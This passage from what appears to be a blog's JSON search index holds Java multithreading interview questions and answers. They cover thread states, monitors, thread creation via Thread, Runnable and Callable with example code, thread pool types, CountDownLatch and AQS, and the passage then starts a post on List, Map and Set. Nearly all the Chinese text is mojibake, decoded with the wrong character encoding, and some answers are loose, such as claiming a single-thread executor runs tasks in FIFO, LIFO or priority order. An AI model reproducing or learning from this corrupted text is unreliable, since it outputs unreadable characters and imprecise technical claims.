ï¼Œåªæœ‰é’ˆå¯¹æ­¤å¯¹è±¡å‘å‡ºnotifyæ–¹æ³•ï¼ˆæˆ–notifyAllï¼‰åæœ¬çº¿ç¨‹æ‰è¿›å…¥å¯¹è±¡é”å®šæ± å‡†å¤‡è·å¾—å¯¹è±¡é”è¿›å…¥è¿è¡ŒçŠ¶æ€ã€‚ è¯·ä½ è¯´æ˜ä¸€ä¸‹åœ¨ç›‘è§†å™¨(Monitor)å†…éƒ¨ï¼Œæ˜¯å¦‚ä½•åšåˆ°çº¿ç¨‹åŒæ­¥çš„ï¼Ÿåœ¨ç¨‹åºåˆåº”è¯¥åšå“ªç§çº§åˆ«çš„åŒæ­¥å‘¢ï¼Ÿç›‘è§†å™¨å’Œé”åœ¨Javaè™šæ‹Ÿæœºä¸­æ˜¯ä¸€å—ä½¿ç”¨çš„ã€‚ç›‘è§†å™¨ç›‘è§†ä¸€å—åŒæ­¥ä»£ç å—ï¼Œç¡®ä¿ä¸€æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒåŒæ­¥ä»£ç å—ã€‚æ¯ä¸€ä¸ªç›‘è§†å™¨éƒ½å’Œä¸€ä¸ªå¯¹è±¡å¼•ç”¨ç›¸å…³è”ã€‚çº¿ç¨‹åœ¨è·å–é”ä¹‹å‰ä¸å…è®¸æ‰§è¡ŒåŒæ­¥ä»£ç ã€‚ åˆ†æä¸€ä¸‹åŒæ­¥æ–¹æ³•å’ŒåŒæ­¥ä»£ç å—çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ŸåŒæ­¥æ–¹æ³•é»˜è®¤ç”¨thisæˆ–è€…å½“å‰ç±»classå¯¹è±¡ä½œä¸ºé”ï¼›åŒæ­¥ä»£ç å—å¯ä»¥é€‰æ‹©ä»¥ä»€ä¹ˆæ¥åŠ é”ï¼Œæ¯”åŒæ­¥æ–¹æ³•è¦æ›´ç»†é¢—ç²’åº¦ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åªåŒæ­¥ä¼šå‘ç”ŸåŒæ­¥é—®é¢˜çš„éƒ¨åˆ†ä»£ç è€Œä¸æ˜¯æ•´ä¸ªæ–¹æ³•ã€‚ è¯·è¯¦ç»†æè¿°ä¸€ä¸‹çº¿ç¨‹ä»åˆ›å»ºåˆ°æ­»äº¡çš„å‡ ç§çŠ¶æ€éƒ½æœ‰å“ªäº›ï¼Ÿ æ–°å»º( new )ï¼šæ–°åˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹å¯¹è±¡ã€‚ å¯è¿è¡Œ( runnable )ï¼šçº¿ç¨‹å¯¹è±¡åˆ›å»ºåï¼Œå…¶ä»–çº¿ç¨‹(æ¯”å¦‚ main çº¿ç¨‹ï¼‰è°ƒç”¨äº†è¯¥å¯¹è±¡ çš„ start ()æ–¹æ³•ã€‚è¯¥çŠ¶æ€çš„çº¿ç¨‹ä½äºå¯è¿è¡Œçº¿ç¨‹æ± ä¸­ï¼Œç­‰å¾…è¢«çº¿ç¨‹è°ƒåº¦é€‰ä¸­ï¼Œè· å– cpu çš„ä½¿ç”¨æƒ ã€‚ è¿è¡Œ( running )ï¼šå¯è¿è¡ŒçŠ¶æ€( runnable )çš„çº¿ç¨‹è·å¾—äº† cpu æ—¶é—´ç‰‡ï¼ˆ timeslice ï¼‰ ï¼Œæ‰§è¡Œç¨‹åºä»£ç ã€‚ é˜»å¡( block )ï¼šé˜»å¡çŠ¶æ€æ˜¯æŒ‡çº¿ç¨‹å› ä¸ºæŸç§åŸå› æ”¾å¼ƒäº† cpu ä½¿ç”¨æƒï¼Œä¹Ÿå³è®©å‡ºäº† cpu timeslice ï¼Œæš‚æ—¶åœæ­¢è¿è¡Œã€‚ç›´åˆ°çº¿ç¨‹è¿›å…¥å¯è¿è¡Œ( runnable )çŠ¶æ€ï¼Œæ‰æœ‰ æœºä¼šå†æ¬¡è·å¾— cpu timeslice è½¬åˆ°è¿è¡Œ( running )çŠ¶æ€ã€‚é˜»å¡çš„æƒ…å†µåˆ†ä¸‰ç§ï¼š(ä¸€). ç­‰å¾…é˜»å¡ï¼šè¿è¡Œ( running )çš„çº¿ç¨‹æ‰§è¡Œ o . wait ()æ–¹æ³•ï¼Œ JVM ä¼šæŠŠè¯¥çº¿ç¨‹æ”¾ å…¥ç­‰å¾…é˜Ÿåˆ—( waitting queue )ä¸­ã€‚(äºŒ). åŒæ­¥é˜»å¡ï¼šè¿è¡Œ( running )çš„çº¿ç¨‹åœ¨è·å–å¯¹è±¡çš„åŒæ­¥é”æ—¶ï¼Œè‹¥è¯¥åŒæ­¥é” è¢«åˆ«çš„çº¿ç¨‹å ç”¨ï¼Œåˆ™ JVM ä¼šæŠŠè¯¥çº¿ç¨‹æ”¾å…¥é”æ± ( lock pool )ä¸­ã€‚(ä¸‰). å…¶ä»–é˜»å¡: è¿è¡Œ( running )çš„çº¿ç¨‹æ‰§è¡Œ Thread . sleep ( long ms )æˆ– t . join ()æ–¹æ³•ï¼Œæˆ–è€…å‘å‡ºäº† I / O è¯·æ±‚æ—¶ï¼Œ JVM ä¼šæŠŠè¯¥çº¿ç¨‹ç½®ä¸ºé˜»å¡çŠ¶æ€ã€‚ å½“ sleep ()çŠ¶æ€è¶…æ—¶ã€ join ()ç­‰å¾…çº¿ç¨‹ç»ˆæ­¢æˆ–è€…è¶…æ—¶ã€æˆ–è€… I / O å¤„ç†å®Œæ¯•æ—¶ï¼Œçº¿ç¨‹é‡æ–°è½¬å…¥å¯è¿è¡Œ( runnable )çŠ¶æ€ã€‚ æ­»äº¡( dead )ï¼šçº¿ç¨‹ run ()ã€ main () æ–¹æ³•æ‰§è¡Œç»“æŸï¼Œæˆ–è€…å› å¼‚å¸¸é€€å‡ºäº† run ()æ–¹æ³•ï¼Œåˆ™è¯¥çº¿ç¨‹ç»“æŸç”Ÿå‘½å‘¨æœŸã€‚æ­»äº¡çš„çº¿ç¨‹ä¸å¯å†æ¬¡å¤ç”Ÿã€‚ åˆ›å»ºçº¿ç¨‹æœ‰å‡ ç§ä¸åŒçš„æ–¹å¼ï¼Ÿä½ å–œæ¬¢å“ªä¸€ç§ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿæœ‰ä¸‰ç§æ–¹å¼å¯ä»¥ç”¨æ¥åˆ›å»ºçº¿ç¨‹ï¼šç»§æ‰¿Threadç±»å®ç°Runnableæ¥å£åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨Executoræ¡†æ¶æ¥åˆ›å»ºçº¿ç¨‹æ± å®ç°Runnableæ¥å£è¿™ç§æ–¹å¼æ›´å—æ¬¢è¿ï¼Œå› ä¸ºè¿™ä¸éœ€è¦ç»§æ‰¿Threadç±»ã€‚åœ¨åº”ç”¨è®¾è®¡ä¸­å·²ç»ç»§æ‰¿äº†åˆ«çš„å¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œè¿™éœ€è¦å¤šç»§æ‰¿ï¼ˆè€ŒJavaä¸æ”¯æŒå¤šç»§æ‰¿ï¼‰ï¼Œåªèƒ½å®ç°æ¥å£ã€‚åŒæ—¶ï¼Œçº¿ç¨‹æ± ä¹Ÿæ˜¯éå¸¸é«˜æ•ˆçš„ï¼Œå¾ˆå®¹æ˜“å®ç°å’Œä½¿ç”¨ã€‚ è§£é‡Šä¸€ä¸‹Javaå¤šçº¿ç¨‹å›è°ƒæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæ‰€è°“å›è°ƒï¼Œå°±æ˜¯å®¢æˆ·ç¨‹åºCè°ƒç”¨æœåŠ¡ç¨‹åºSä¸­çš„æŸä¸ªæ–¹æ³•Aï¼Œç„¶åSåˆåœ¨æŸä¸ªæ—¶å€™åè¿‡æ¥è°ƒç”¨Cä¸­çš„æŸä¸ªæ–¹æ³•Bï¼Œå¯¹äºCæ¥è¯´ï¼Œè¿™ä¸ªBä¾¿å«åšå›è°ƒæ–¹æ³•ã€‚ åˆ—ä¸¾ä¸€ä¸‹å¯åŠ¨çº¿ç¨‹æœ‰å“ªå‡ ç§æ–¹å¼ï¼Œä¹‹åå†è¯´æ˜ä¸€ä¸‹çº¿ç¨‹æ± çš„ç§ç±»éƒ½æœ‰å“ªäº›ï¼Ÿâ‘ å¯åŠ¨çº¿ç¨‹æœ‰å¦‚ä¸‹ä¸‰ç§æ–¹å¼ï¼š ä¸€ã€ç»§æ‰¿Threadç±»åˆ›å»ºçº¿ç¨‹ç±» ï¼ˆ1ï¼‰å®šä¹‰Threadç±»çš„å­ç±»ï¼Œå¹¶é‡å†™è¯¥ç±»çš„runæ–¹æ³•ï¼Œè¯¥runæ–¹æ³•çš„æ–¹æ³•ä½“å°±ä»£è¡¨äº†çº¿ç¨‹è¦å®Œæˆçš„ä»»åŠ¡ã€‚å› æ­¤æŠŠrun()æ–¹æ³•ç§°ä¸ºæ‰§è¡Œä½“ã€‚ ï¼ˆ2ï¼‰åˆ›å»ºThreadå­ç±»çš„å®ä¾‹ï¼Œå³åˆ›å»ºäº†çº¿ç¨‹å¯¹è±¡ã€‚ ï¼ˆ3ï¼‰è°ƒç”¨çº¿ç¨‹å¯¹è±¡çš„start()æ–¹æ³•æ¥å¯åŠ¨è¯¥çº¿ç¨‹ã€‚ ä»£ç ï¼š package com.thread; public class FirstThreadTest extends Thread{ int i = 0; //é‡å†™runæ–¹æ³•ï¼Œrunæ–¹æ³•çš„æ–¹æ³•ä½“å°±æ˜¯ç°åœºæ‰§è¡Œä½“ public void run() { for(;i&lt;100;i++){ System.out.println(getName()+&quot; &quot;+i); } } public static void main(String[] args) { for(int i = 0;i&lt; 100;i++) { System.out.println(Thread.currentThread().getName()+&quot; : &quot;+i); if(i==20) { new FirstThreadTest().start(); new FirstThreadTest().start(); } } } } ä¸Šè¿°ä»£ç ä¸­Thread.currentThread()æ–¹æ³•è¿”å›å½“å‰æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹å¯¹è±¡ã€‚GetName()æ–¹æ³•è¿”å›è°ƒç”¨è¯¥æ–¹æ³•çš„çº¿ç¨‹çš„åå­—ã€‚ äºŒã€é€šè¿‡Runnableæ¥å£åˆ›å»ºçº¿ç¨‹ç±» ï¼ˆ1ï¼‰å®šä¹‰runnableæ¥å£çš„å®ç°ç±»ï¼Œå¹¶é‡å†™è¯¥æ¥å£çš„run()æ–¹æ³•ï¼Œè¯¥run()æ–¹æ³•çš„æ–¹æ³•ä½“åŒæ ·æ˜¯è¯¥çº¿ç¨‹çš„çº¿ç¨‹æ‰§è¡Œä½“ã€‚ ï¼ˆ2ï¼‰åˆ›å»º Runnableå®ç°ç±»çš„å®ä¾‹ï¼Œå¹¶ä¾æ­¤å®ä¾‹ä½œä¸ºThreadçš„targetæ¥åˆ›å»ºThreadå¯¹è±¡ï¼Œè¯¥Threadå¯¹è±¡æ‰æ˜¯çœŸæ­£çš„çº¿ç¨‹å¯¹è±¡ã€‚ ï¼ˆ3ï¼‰è°ƒç”¨çº¿ç¨‹å¯¹è±¡çš„start()æ–¹æ³•æ¥å¯åŠ¨è¯¥çº¿ç¨‹ã€‚ ä»£ç ï¼š package com.thread; public class RunnableThreadTest implements Runnable { private int i; public void run() { for(i = 0;i &lt;100;i++) { System.out.println(Thread.currentThread().getName()+&quot; &quot;+i); } } public static void main(String[] args) { for(int i = 0;i &lt; 100;i++) { System.out.println(Thread.currentThread().getName()+&quot; &quot;+i); if(i==20) { RunnableThreadTest rtt = new RunnableThreadTest(); new Thread(rtt,&quot;æ–°çº¿ç¨‹1&quot;).start(); new Thread(rtt,&quot;æ–°çº¿ç¨‹2&quot;).start(); } } } } ä¸‰ã€é€šè¿‡Callableå’ŒFutureåˆ›å»ºçº¿ç¨‹ ï¼ˆ1ï¼‰åˆ›å»ºCallableæ¥å£çš„å®ç°ç±»ï¼Œå¹¶å®ç°call()æ–¹æ³•ï¼Œè¯¥call()æ–¹æ³•å°†ä½œä¸ºçº¿ç¨‹æ‰§è¡Œä½“ï¼Œå¹¶ä¸”æœ‰è¿”å›å€¼ã€‚ ï¼ˆ2ï¼‰åˆ›å»ºCallableå®ç°ç±»çš„å®ä¾‹ï¼Œä½¿ç”¨FutureTaskç±»æ¥åŒ…è£…Callableå¯¹è±¡ï¼Œè¯¥FutureTaskå¯¹è±¡å°è£…äº†è¯¥Callableå¯¹è±¡çš„call()æ–¹æ³•çš„è¿”å›å€¼ã€‚ ï¼ˆ3ï¼‰ä½¿ç”¨FutureTaskå¯¹è±¡ä½œä¸ºThreadå¯¹è±¡çš„targetåˆ›å»ºå¹¶å¯åŠ¨æ–°çº¿ç¨‹ã€‚ ï¼ˆ4ï¼‰è°ƒç”¨FutureTaskå¯¹è±¡çš„get()æ–¹æ³•æ¥è·å¾—å­çº¿ç¨‹æ‰§è¡Œç»“æŸåçš„è¿”å›å€¼ ä»£ç ï¼š package com.thread; import java.util.concurrent.Callable; import java.util.concurrent.ExecutionException; import java.util.concurrent.FutureTask; public class CallableThreadTest implements Callable&lt;Integer&gt; { public static void main(String[] args) { CallableThreadTest ctt = new CallableThreadTest(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(ctt); for(int i = 0;i &lt; 100;i++) { System.out.println(Thread.currentThread().getName()+&quot; çš„å¾ªç¯å˜é‡içš„å€¼&quot;+i); if(i==20) { new Thread(ft,&quot;æœ‰è¿”å›å€¼çš„çº¿ç¨‹&quot;).start(); } } try { System.out.println(&quot;å­çº¿ç¨‹çš„è¿”å›å€¼ï¼š&quot;+ft.get()); } catch (InterruptedException e) { e.printStackTrace(); } catch (ExecutionException e) { e.printStackTrace(); } } @Override public Integer call() throws Exception { int i = 0; for(;i&lt;100;i++) { System.out.println(Thread.currentThread().getName()+&quot; &quot;+i); } return i; } } â‘¡çº¿ç¨‹æ± çš„ç§ç±»æœ‰ï¼š Javaé€šè¿‡Executorsæä¾›å››ç§çº¿ç¨‹æ± ï¼Œåˆ†åˆ«ä¸ºï¼š newCachedThreadPoolåˆ›å»ºä¸€ä¸ªå¯ç¼“å­˜çº¿ç¨‹æ± ï¼Œå¦‚æœçº¿ç¨‹æ± é•¿åº¦è¶…è¿‡å¤„ç†éœ€è¦ï¼Œå¯çµæ´»å›æ”¶ç©ºé—²çº¿ç¨‹ï¼Œè‹¥æ— å¯å›æ”¶ï¼Œåˆ™æ–°å»ºçº¿ç¨‹ã€‚newFixedThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œå¯æ§åˆ¶çº¿ç¨‹æœ€å¤§å¹¶å‘æ•°ï¼Œè¶…å‡ºçš„çº¿ç¨‹ä¼šåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…ã€‚newScheduledThreadPool åˆ›å»ºä¸€ä¸ªå®šé•¿çº¿ç¨‹æ± ï¼Œæ”¯æŒå®šæ—¶åŠå‘¨æœŸæ€§ä»»åŠ¡æ‰§è¡Œã€‚newSingleThreadExecutor åˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹åŒ–çš„çº¿ç¨‹æ± ï¼Œå®ƒåªä¼šç”¨å”¯ä¸€çš„å·¥ä½œçº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œä¿è¯æ‰€æœ‰ä»»åŠ¡æŒ‰ç…§æŒ‡å®šé¡ºåº(FIFO, LIFO, ä¼˜å…ˆçº§)æ‰§è¡Œã€‚ ç®€è¦è¯´æ˜ä¸€ä¸‹JAVAä¸­cyclicbarrierå’Œcountdownlatchçš„åŒºåˆ«åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼ŸCountDownLatchå’ŒCyclicBarrieréƒ½èƒ½å¤Ÿå®ç°çº¿ç¨‹ä¹‹é—´çš„ç­‰å¾…ï¼Œåªä¸è¿‡å®ƒä»¬ä¾§é‡ç‚¹ä¸åŒï¼š CountDownLatchä¸€èˆ¬ç”¨äºæŸä¸ªçº¿ç¨‹Aç­‰å¾…è‹¥å¹²ä¸ªå…¶ä»–çº¿ç¨‹æ‰§è¡Œå®Œä»»åŠ¡ä¹‹åï¼Œå®ƒæ‰æ‰§è¡Œï¼› è€ŒCyclicBarrierä¸€èˆ¬ç”¨äºä¸€ç»„çº¿ç¨‹äº’ç›¸ç­‰å¾…è‡³æŸä¸ªçŠ¶æ€ï¼Œç„¶åè¿™ä¸€ç»„çº¿ç¨‹å†åŒæ—¶æ‰§è¡Œï¼› å¦å¤–ï¼ŒCountDownLatchæ˜¯ä¸èƒ½å¤Ÿé‡ç”¨çš„ï¼Œè€ŒCyclicBarrieræ˜¯å¯ä»¥é‡ç”¨çš„ã€‚ è¯´æ˜ä¸€ä¸‹çº¿ç¨‹æ± æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿç¬¬ä¸€ï¼šé™ä½èµ„æºæ¶ˆè€—ã€‚é€šè¿‡é‡å¤åˆ©ç”¨å·²åˆ›å»ºçš„çº¿ç¨‹é™ä½çº¿ç¨‹åˆ›å»ºå’Œé”€æ¯é€ æˆçš„æ¶ˆè€—ã€‚ ç¬¬äºŒï¼šæé«˜å“åº”é€Ÿåº¦ã€‚å½“ä»»åŠ¡åˆ°è¾¾æ—¶ï¼Œä»»åŠ¡å¯ä»¥ä¸éœ€è¦ç­‰åˆ°çº¿ç¨‹åˆ›å»ºå°±èƒ½æ‰§è¡Œã€‚ ç¬¬ä¸‰ï¼šæé«˜çº¿ç¨‹çš„å¯ç®¡ç†æ€§ï¼Œçº¿ç¨‹æ˜¯ç¨€ç¼ºèµ„æºï¼Œå¦‚æœæ— é™åˆ¶åœ°åˆ›å»ºï¼Œä¸ä»…ä¼šæ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œè¿˜ä¼šé™ä½ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œä½¿ç”¨çº¿ç¨‹æ± å¯ä»¥è¿›è¡Œç»Ÿä¸€åˆ†é…ã€è°ƒä¼˜å’Œç›‘æ§ã€‚ è¯·å›ç­”ä¸€ä¸‹Javaä¸­æœ‰å‡ ç§çº¿ç¨‹æ± ï¼Ÿå¹¶ä¸”è¯¦ç»†æè¿°ä¸€ä¸‹çº¿ç¨‹æ± çš„å®ç°è¿‡ç¨‹ 1ã€newFixedThreadPoolåˆ›å»ºä¸€ä¸ªæŒ‡å®šå·¥ä½œçº¿ç¨‹æ•°é‡çš„çº¿ç¨‹æ± ã€‚æ¯å½“æäº¤ä¸€ä¸ªä»»åŠ¡å°±åˆ›å»ºä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œå¦‚æœå·¥ä½œçº¿ç¨‹æ•°é‡è¾¾åˆ°çº¿ç¨‹æ± åˆå§‹çš„æœ€å¤§æ•°ï¼Œåˆ™å°†æäº¤çš„ä»»åŠ¡å­˜å…¥åˆ°æ± é˜Ÿåˆ—ä¸­ã€‚2ã€newCachedThreadPoolåˆ›å»ºä¸€ä¸ªå¯ç¼“å­˜çš„çº¿ç¨‹æ± ã€‚è¿™ç§ç±»å‹çš„çº¿ç¨‹æ± ç‰¹ç‚¹æ˜¯ï¼š 1).å·¥ä½œçº¿ç¨‹çš„åˆ›å»ºæ•°é‡å‡ ä¹æ²¡æœ‰é™åˆ¶(å…¶å®ä¹Ÿæœ‰é™åˆ¶çš„,æ•°ç›®ä¸ºInterger. MAX_VALUE), è¿™æ ·å¯çµæ´»çš„å¾€çº¿ç¨‹æ± ä¸­æ·»åŠ çº¿ç¨‹ã€‚2).å¦‚æœé•¿æ—¶é—´æ²¡æœ‰å¾€çº¿ç¨‹æ± ä¸­æäº¤ä»»åŠ¡ï¼Œå³å¦‚æœå·¥ä½œçº¿ç¨‹ç©ºé—²äº†æŒ‡å®šçš„æ—¶é—´(é»˜è®¤ä¸º1åˆ†é’Ÿ)ï¼Œåˆ™è¯¥å·¥ä½œçº¿ç¨‹å°†è‡ªåŠ¨ç»ˆæ­¢ã€‚ç»ˆæ­¢åï¼Œå¦‚æœä½ åˆæäº¤äº†æ–°çš„ä»»åŠ¡ï¼Œåˆ™çº¿ç¨‹æ± é‡æ–°åˆ›å»ºä¸€ä¸ªå·¥ä½œçº¿ç¨‹ã€‚3ã€newSingleThreadExecutoråˆ›å»ºä¸€ä¸ªå•çº¿ç¨‹åŒ–çš„Executorï¼Œå³åªåˆ›å»ºå”¯ä¸€çš„å·¥ä½œè€…çº¿ç¨‹æ¥æ‰§è¡Œä»»åŠ¡ï¼Œå¦‚æœè¿™ä¸ªçº¿ç¨‹å¼‚å¸¸ç»“æŸï¼Œä¼šæœ‰å¦ä¸€ä¸ªå–ä»£å®ƒï¼Œä¿è¯é¡ºåºæ‰§è¡Œ(æˆ‘è§‰å¾—è¿™ç‚¹æ˜¯å®ƒçš„ç‰¹è‰²)ã€‚å•å·¥ä½œçº¿ç¨‹æœ€å¤§çš„ç‰¹ç‚¹æ˜¯å¯ä¿è¯é¡ºåºåœ°æ‰§è¡Œå„ä¸ªä»»åŠ¡ï¼Œå¹¶ä¸”åœ¨ä»»æ„ç»™å®šçš„æ—¶é—´ä¸ä¼šæœ‰å¤šä¸ªçº¿ç¨‹æ˜¯æ´»åŠ¨çš„ ã€‚4ã€newScheduleThreadPoolåˆ›å»ºä¸€ä¸ªå®šé•¿çš„çº¿ç¨‹æ± ï¼Œè€Œä¸”æ”¯æŒå®šæ—¶çš„ä»¥åŠå‘¨æœŸæ€§çš„ä»»åŠ¡æ‰§è¡Œï¼Œç±»ä¼¼äºTimerã€‚(è¿™ç§çº¿ç¨‹æ± åŸç†æš‚è¿˜æ²¡å®Œå…¨äº†è§£é€å½») è¯·è¯´æ˜ä¸€ä¸‹Javaä¸­éƒ½æœ‰å“ªäº›æ–¹å¼å¯ä»¥å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Ÿ ç»§æ‰¿è‡ªThreadç±» å®ç°Runnableæ¥å£ å³å®ç°Runnableæ¥å£ï¼Œä¹Ÿç»§æ‰¿Threadç±»ï¼Œå¹¶é‡å†™runæ–¹æ³• è¯·åˆ—ä¸¾ä¸€ä¸‹åˆ›å»ºçº¿ç¨‹çš„æ–¹æ³•ï¼Œå¹¶ç®€è¦è¯´æ˜ä¸€ä¸‹åœ¨è¿™äº›æ–¹æ³•ä¸­å“ªä¸ªæ–¹æ³•æ›´å¥½ï¼ŒåŸå› æ˜¯ä»€ä¹ˆï¼Ÿéœ€è¦ä»Java.lang.Threadç±»æ´¾ç”Ÿä¸€ä¸ªæ–°çš„çº¿ç¨‹ç±»ï¼Œé‡è½½å®ƒçš„run()æ–¹æ³•ï¼› å®ç°Runnalbeæ¥å£ï¼Œé‡è½½Runnalbeæ¥å£ä¸­çš„run()æ–¹æ³•ã€‚ å®ç°Runnalbeæ¥å£æ›´å¥½ï¼Œä½¿ç”¨å®ç°Runnableæ¥å£çš„æ–¹å¼åˆ›å»ºçš„çº¿ç¨‹å¯ä»¥å¤„ç†åŒä¸€èµ„æºï¼Œä»è€Œå®ç°èµ„æºçš„å…±äº«. ç®€çŸ­è¯´æ˜ä¸€ä¸‹ä½ å¯¹AQSçš„ç†è§£ã€‚ AQSå…¶å®å°±æ˜¯ä¸€ä¸ªå¯ä»¥ç»™æˆ‘ä»¬å®ç°é”çš„æ¡†æ¶å†…éƒ¨å®ç°çš„å…³é”®æ˜¯ï¼šå…ˆè¿›å…ˆå‡ºçš„é˜Ÿåˆ—ã€stateçŠ¶æ€å®šä¹‰äº†å†…éƒ¨ç±»ConditionObjectæ‹¥æœ‰ä¸¤ç§çº¿ç¨‹æ¨¡å¼ç‹¬å æ¨¡å¼å’Œå…±äº«æ¨¡å¼ã€‚åœ¨LOCKåŒ…ä¸­çš„ç›¸å…³é”(å¸¸ç”¨çš„æœ‰ReentrantLockã€ ReadWriteLock)éƒ½æ˜¯åŸºäºAQSæ¥æ„å»ºï¼Œä¸€èˆ¬æˆ‘ä»¬å«AQSä¸ºåŒæ­¥å™¨ã€‚ è¯·ç®€è¿°ä¸€ä¸‹çº¿ç¨‹æ± çš„è¿è¡Œæµç¨‹ï¼Œä½¿ç”¨å‚æ•°ä»¥åŠæ–¹æ³•ç­–ç•¥ç­‰çº¿ç¨‹æ± ä¸»è¦å°±æ˜¯æŒ‡å®šçº¿ç¨‹æ± æ ¸å¿ƒçº¿ç¨‹æ•°å¤§å°ï¼Œæœ€å¤§çº¿ç¨‹æ•°ï¼Œå­˜å‚¨çš„é˜Ÿåˆ—ï¼Œæ‹’ç»ç­–ç•¥ï¼Œç©ºé—²çº¿ç¨‹å­˜æ´»æ—¶é•¿ã€‚å½“éœ€è¦ä»»åŠ¡å¤§äºæ ¸å¿ƒçº¿ç¨‹æ•°æ—¶å€™ï¼Œå°±å¼€å§‹æŠŠä»»åŠ¡å¾€å­˜å‚¨ä»»åŠ¡çš„é˜Ÿåˆ—é‡Œï¼Œå½“å­˜å‚¨é˜Ÿåˆ—æ»¡äº†çš„è¯ï¼Œå°±å¼€å§‹å¢åŠ çº¿ç¨‹æ± åˆ›å»ºçš„çº¿ç¨‹æ•°é‡ï¼Œå¦‚æœå½“çº¿ç¨‹æ•°é‡ä¹Ÿè¾¾åˆ°äº†æœ€å¤§ï¼Œå°±å¼€å§‹æ‰§è¡Œæ‹’ç»ç­–ç•¥ï¼Œæ¯”å¦‚è¯´è®°å½•æ—¥å¿—ï¼Œç›´æ¥ä¸¢å¼ƒï¼Œæˆ–è€…ä¸¢å¼ƒæœ€è€çš„ä»»åŠ¡ã€‚ çº¿ç¨‹ï¼Œè¿›ç¨‹ï¼Œç„¶åçº¿ç¨‹åˆ›å»ºæœ‰å¾ˆå¤§å¼€é”€ï¼Œæ€ä¹ˆä¼˜åŒ–ï¼Ÿ å¯ä»¥ä½¿ç”¨çº¿ç¨‹æ± ã€‚ ä»€ä¹ˆæ˜¯ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼ï¼Ÿç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜æ˜¯çº¿ç¨‹æ¨¡å‹ä¸­çš„ç»å…¸é—®é¢˜ï¼šç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…åœ¨åŒä¸€æ—¶é—´æ®µå†…å…±ç”¨åŒä¸€å­˜å‚¨ç©ºé—´ï¼Œç”Ÿäº§è€…å‘ç©ºé—´é‡Œç”Ÿäº§æ•°æ®ï¼Œè€Œæ¶ˆè´¹è€…å–èµ°æ•°æ®ã€‚ ä¼˜ç‚¹ï¼šæ”¯æŒå¹¶å‘ã€è§£è€¦ã€‚ ç®€è¿°ä¸€ä¸‹å®ç°å¤šçº¿ç¨‹åŒæ­¥çš„æ–¹æ³•ï¼Ÿå¯ä»¥ä½¿ç”¨synchronizedã€lockã€volatileå’ŒThreadLocalæ¥å®ç°åŒæ­¥ã€‚ å¦‚ä½•åœ¨çº¿ç¨‹å®‰å…¨çš„æƒ…å†µä¸‹å®ç°ä¸€ä¸ªè®¡æ•°å™¨ï¼Ÿå¯ä»¥ä½¿ç”¨åŠ é”ï¼Œæ¯”å¦‚synchronizedæˆ–è€…lockã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ConcurrentåŒ…ä¸‹çš„åŸå­ç±»ã€‚ å¤šçº¿ç¨‹ä¸­çš„i++çº¿ç¨‹å®‰å…¨å—ï¼Ÿè¯·ç®€è¿°ä¸€ä¸‹åŸå› ï¼Ÿä¸å®‰å…¨ã€‚i++ä¸æ˜¯åŸå­æ€§æ“ä½œã€‚i++åˆ†ä¸ºè¯»å–iå€¼ï¼Œå¯¹iå€¼åŠ ä¸€ï¼Œå†èµ‹å€¼ç»™i++ï¼Œæ‰§è¡ŒæœŸä¸­ä»»ä½•ä¸€æ­¥éƒ½æ˜¯æœ‰å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æŠ¢å çš„ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"Array","slug":"Array","date":"2020-07-13T21:29:08.000Z","updated":"2021-04-11T17:11:28.090Z","comments":true,"path":"Array/","link":"","permalink":"https://blog.kayleh.top/Array/","excerpt":"Array","text":"Array Listã€Mapã€Setä¸‰ä¸ªæ¥å£å­˜å–å…ƒç´ æ—¶ï¼Œå„æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ Listä»¥ç‰¹å®šç´¢å¼•æ¥å­˜å–å…ƒç´ ï¼Œå¯ä»¥æœ‰é‡å¤å…ƒç´ ã€‚ Setä¸èƒ½å­˜æ”¾é‡å¤å…ƒç´ ï¼ˆç”¨å¯¹è±¡çš„equals()æ–¹æ³•æ¥åŒºåˆ†å…ƒç´ æ˜¯å¦é‡å¤ï¼‰ã€‚ Mapä¿å­˜é”®å€¼å¯¹ï¼ˆkey-value pairï¼‰æ˜ å°„ï¼Œæ˜ å°„å…³ç³»å¯ä»¥æ˜¯ä¸€å¯¹ä¸€æˆ–å¤šå¯¹ä¸€ã€‚ Setå’ŒMapå®¹å™¨éƒ½æœ‰åŸºäºå“ˆå¸Œå­˜å‚¨å’Œæ’åºæ ‘çš„ä¸¤ç§å®ç°ç‰ˆæœ¬ï¼ŒåŸºäºå“ˆå¸Œå­˜å‚¨çš„ç‰ˆæœ¬ç†è®ºå­˜å–æ—¶é—´å¤æ‚åº¦ä¸ºO(1)ï¼Œè€ŒåŸºäºæ’åºæ ‘ç‰ˆæœ¬çš„å®ç°åœ¨æ’å…¥æˆ–åˆ é™¤å…ƒç´ æ—¶ä¼šæŒ‰ç…§å…ƒç´ æˆ–å…ƒç´ çš„é”®ï¼ˆkeyï¼‰æ„æˆæ’åºæ ‘ä»è€Œè¾¾åˆ°æ’åºå’Œå»é‡çš„æ•ˆæœã€‚ 